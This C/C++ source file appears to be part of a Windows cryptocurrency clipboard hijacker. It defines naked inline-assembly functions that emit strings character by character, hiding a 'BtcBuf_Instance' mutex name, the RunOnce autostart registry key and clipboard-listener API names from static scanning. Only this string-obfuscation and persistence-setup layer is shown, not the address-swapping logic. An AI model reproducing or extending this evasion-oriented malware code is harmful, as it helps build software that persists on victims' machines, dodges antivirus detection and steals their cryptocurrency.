#define WIN32_LEAN_AND_MEAN
#pragma warning(disable : 4995)
#pragma warning(disable : 4996)

#include <Windows.h>
#include <Shlwapi.h>

#undef RtlZeroMemory
#undef RtlMoveMemory

extern "C" __declspec(dllimport) VOID __stdcall RtlZeroMemory(PVOID dst, ULONG Length);
extern "C" __declspec(dllimport) VOID __stdcall RtlMoveMemory(PVOID Destination, PVOID Source, ULONG Length);
extern "C" __declspec(dllimport) VOID __stdcall RtlGetNtVersionNumbers(LPDWORD pdwMajorVersion, LPDWORD pdwMinorVersion, LPDWORD pdwBuildNumber);
extern "C" __declspec(dllimport) int __stdcall RtlComputeCrc32(INT accumCRC32, const BYTE* buffer, UINT buflen);

#ifdef _WIN64
TCHAR* MUTEX_TXT(){return TEXT("BtcBuf_Instance");}
TCHAR* RUNKEY_TXT(){return TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");}
TCHAR* user32_TXT(){return TEXT("user32.dll");}
char* AddClipboardFormatListener_TXT(){return "AddClipboardFormatListener";}
char* RemoveClipboardFormatListener_TXT(){return "RemoveClipboardFormatListener";}
#else
#ifdef _UNICODE
__declspec(naked) wchar_t* RUNKEY_TXT()
{
	__asm
	{
		call    _n
		_emit   'S'
		_emit   '\0'
		_emit   'o'
		_emit   '\0'
		_emit   'f'
		_emit   '\0'
		_emit   't'
		_emit   '\0'
		_emit   'w'
		_emit   '\0'
		_emit   'a'
		_emit   '\0'
		_emit   'r'
		_emit   '\0'
		_emit   'e'
		_emit   '\0'
		_emit   '\\'
		_emit   '\0'
		_emit   'M'
		_emit   '\0'
		_emit   'i'
		_emit   '\0'
		_emit   'c'
		_emit   '\0'
		_emit   'r'
		_emit   '\0'
		_emit   'o'
		_emit   '\0'
		_emit   's'
		_emit   '\0'
		_emit   'o'
		_emit   '\0'
		_emit   'f'
		_emit   '\0'
		_emit   't'
		_emit   '\0'
		_emit   '\\'
		_emit   '\0'
		_emit   'W'
		_emit   '\0'
		_emit   'i'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   'd'
		_emit   '\0'
		_emit   'o'
		_emit   '\0'
		_emit   'w'
		_emit   '\0'
		_emit   's'
		_emit   '\0'
		_emit   '\\'
		_emit   '\0'
		_emit   'C'
		_emit   '\0'
		_emit   'u'
		_emit   '\0'
		_emit   'r'
		_emit   '\0'
		_emit   'r'
		_emit   '\0'
		_emit   'e'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   't'
		_emit   '\0'
		_emit   'V'
		_emit   '\0'
		_emit   'e'
		_emit   '\0'
		_emit   'r'
		_emit   '\0'
		_emit   's'
		_emit   '\0'
		_emit   'i'
		_emit   '\0'
		_emit   'o'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   '\\'
		_emit   '\0'
		_emit   'R'
		_emit   '\0'
		_emit   'u'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   'O'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   'c'
		_emit   '\0'
		_emit   'e'
		_emit   '\0'
		_emit   0
		_emit   0
		_n:
		pop     eax
		ret
	}
}

__declspec(naked) wchar_t* user32_TXT()
{
	__asm
	{
		call    _n
		_emit   'u'
		_emit   '\0'
		_emit   's'
		_emit   '\0'
		_emit   'e'
		_emit   '\0'
		_emit   'r'
		_emit   '\0'
		_emit   '3'
		_emit   '\0'
		_emit   '2'
		_emit   '\0'
		_emit   '.'
		_emit   '\0'
		_emit   'd'
		_emit   '\0'
		_emit   'l'
		_emit   '\0'
		_emit   'l'
		_emit   '\0'
		_emit   0
		_emit   0
		_n:
		pop     eax
		ret
	}
}

__declspec(naked) wchar_t* MUTEX_TXT()
{
	__asm
	{
		call    _n
		_emit   'B'
		_emit   '\0'
		_emit   't'
		_emit   '\0'
		_emit   'c'
		_emit   '\0'
		_emit   'B'
		_emit   '\0'
		_emit   'u'
		_emit   '\0'
		_emit   'f'
		_emit   '\0'
		_emit   '_'
		_emit   '\0'
		_emit   'I'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   's'
		_emit   '\0'
		_emit   't'
		_emit   '\0'
		_emit   'a'
		_emit   '\0'
		_emit   'n'
		_emit   '\0'
		_emit   'c'
		_emit   '\0'
		_emit   'e'
		_emit   '\0'
		_emit   0
		_emit   0
		_n:
		pop     eax
		ret
	}
}
#else
__declspec(naked) char* RUNKEY_TXT()
{
	__asm
	{
		call    _n
		_emit   'S'
		_emit   'o'
		_emit   'f'
		_emit   't'
		_emit   'w'
		_emit   'a'
		_emit   'r'
		_emit   'e'
		_emit   '\\'
		_emit   'M'
		_emit   'i'
		_emit   'c'
		_emit   'r'
		_emit   'o'
		_emit   's'
		_emit   'o'
		_emit   'f'
		_emit   't'
		_emit   '\\'
		_emit   'W'
		_emit   'i'
		_emit   'n'
		_emit   'd'
		_emit   'o'
		_emit   'w'
		_emit   's'
		_emit   '\\'
		_emit   'C'
		_emit   'u'
		_emit   'r'
		_emit   'r'
		_emit   'e'
		_emit   'n'
		_emit   't'
		_emit   'V'
		_emit   'e'
		_emit   'r'
		_emit   's'
		_emit   'i'
		_emit   'o'
		_emit   'n'
		_emit   '\\'
		_emit   'R'
		_emit   'u'
		_emit   'n'
		_emit   'O'
		_emit   'n'
		_emit   'c'
		_emit   'e'
		_emit   0
		_n:
		pop     eax
		ret
	}
}

__declspec(naked) char* user32_TXT()
{
	__asm
	{
		call    _n
		_emit   'u'
		_emit   's'
		_emit   'e'
		_emit   'r'
		_emit   '3'
		_emit   '2'
		_emit   '.'
		_emit   'd'
		_emit   'l'
		_emit   'l'
		_emit   0
		_n:
		pop     eax
		ret
	}
}

__declspec(naked) char* MUTEX_TXT()
{
	__asm
	{
		call    _n
		_emit   'B'
		_emit   't'
		_emit   'c'
		_emit   'B'
		_emit   'u'
		_emit   'f'
		_emit   '_'
		_emit   'I'
		_emit   'n'
		_emit   's'
		_emit   't'
		_emit   'a'
		_emit   'n'
		_emit   'c'
		_emit   'e'
		_emit   0
		_n:
		pop     eax
		ret
	}
}
#endif

__declspec(naked) char* AddClipboardFormatListener_TXT()
{
	__asm
	{
		call    _n
		_emit   'A'
		_emit   'd'
		_emit   'd'
		_emit   'C'
		_emit   'l'
		_emit   'i'
		_emit   'p'
		_emit   'b'
		_emit   'o'
		_emit   'a'
		_emit   'r'
		_emit   'd'
		_emit   'F'
		_emit   'o'
		_emit   'r'
		_emit   'm'
		_emit   'a'
		_emit   't'
		_emit   'L'
		_emit   'i'
		_emit   's'
		_emit   't'
		_emit   'e'
		_emit   'n'
		_emit   'e'
		_emit   'r'
		_emit   0
		_n:
		pop     eax
		ret
	}
}

__declspec(naked) char* RemoveClipboardFormatListener_TXT()
{
	__asm
	{
		call    _n
		_emit   'R'
		_emit   'e'
		_emit   'm'
		_emit   'o'
		_emit   'v'
		_emit   'e'
		_emit   'C'
		_emit   'l'
		_emit   'i'
		_emit   'p'
		_emit   'b'
		_emit   'o'
		_emit   'a'
		_emit   'r'
		_emit   'd'
		_emit   'F'
		_emit   'o'
		_emit   'r'
		_emit   'm'
		_emit   'a'
		_emit   't'
		_emit   'L'
		_emit   'i'
		_emit   's'
		_emit   't'
		_emit   'e'
		_emit   'n'
		_emit   'e'
		_emit   'r'
		_emit   0
		_n:
		pop     eax
		ret
	}
}
#endif
